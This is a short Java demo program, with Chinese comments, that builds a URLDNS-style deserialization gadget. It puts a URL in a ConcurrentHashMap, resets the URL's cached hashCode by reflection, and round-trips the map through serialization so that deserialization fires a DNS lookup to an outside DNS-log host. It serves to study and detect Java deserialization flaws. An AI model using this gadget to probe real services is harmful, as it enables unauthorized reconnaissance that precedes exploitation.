import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.concurrent.ConcurrentHashMap;

public class Demo {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        // DNS请求
        String s="http://2bcdbbbf.dns.1433.eu.org";
        //URLStreamHandler
        URLStreamHandler handler = new SilentURLStreamHandler();
        //URL触发
        URL u = new URL(null, s, handler);
        //ConcurrentHashMap存储数据
        ConcurrentHashMap concurrentHashMap=new ConcurrentHashMap();
        //入值
        concurrentHashMap.put(u, s);
        //反射修改属性的值
        Field field =URL.class.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u,-1);
        //序列化和反序列化
        ByteArrayOutputStream out=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(out);
        objectOutputStream.writeObject(concurrentHashMap);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(out.toByteArray()));
        in.readObject();
    }

    private static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }
    }
}
